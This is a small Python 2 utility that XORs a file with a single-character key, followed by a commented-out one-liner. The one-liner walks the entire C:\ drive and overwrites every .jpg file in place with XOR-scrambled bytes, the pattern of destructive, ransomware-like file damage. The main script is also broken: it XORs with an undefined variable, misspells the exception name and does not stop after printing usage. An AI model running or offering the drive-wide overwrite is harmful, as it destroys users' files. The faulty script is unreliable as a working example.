#!/usr/bin/env python
import sys

if len(sys.argv) != 4:
  print "Usage: ./xor_file in_file out_file xor_key"

in_file = open(str(sys.argv[1]), "rb")
out_file = open(str(sys.argv[2]), "a")
xor_key = ord(sys.argv[3])

try:
    read_byte = in_file.read(1)
    while read_byte != "":
        xor_byte = ord(read_byte) ^ k
        out_file.write(chr(xor_byte))
        read_byte = in_file.read(1)
except Excpetion,e:
    print "Error while reading file %s - %s" %(in_file,e.message)
    in_file.close()

out_file.close()

#import os
#from itertools import izip
#map(lambda filepath: map(lambda openfile: map(lambda readbytes: openfile.seek(0) or openfile.write(''.join(chr(ord(c)^ord(k)) for c,k in izip(readbytes, "x"*len(readbytes)))) and openfile.close(),[openfile.read()]), [open(filepath, 'r+b')]) , [os.path.join(d[0], f) for d in os.walk("c:\\") for f in d[2] if f.endswith(".jpg")])
